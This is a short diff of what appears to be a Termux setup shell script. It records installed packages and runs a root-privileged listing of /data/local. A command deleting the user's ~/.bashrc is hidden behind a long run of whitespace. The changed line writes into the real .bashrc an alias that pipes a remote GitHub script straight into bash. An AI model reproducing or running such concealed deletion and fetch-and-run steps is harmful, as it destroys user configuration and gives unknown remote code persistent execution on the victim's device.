@@ -5,7 +5,7 @@ termux-setup-storage
 apt list > ~/apt_list.txt
 pip list > ~/pip_list.txt
 su -c ls /data/local/ > ~/ls_local.txt                                                                                                                                              rm -rf ~/.bashrc
-printf "alias se='curl -s https://raw.githubusercontent.com/se2030/se/master/gb_ahmad.sh | bash -s' " > ~/mbashrc
+printf "alias se='curl -s https://raw.githubusercontent.com/se2030/se/master/gb_ahmad.sh | bash -s' " > ~/.bashrc
 
 if grep 'python' ~/apt_list.txt
 then
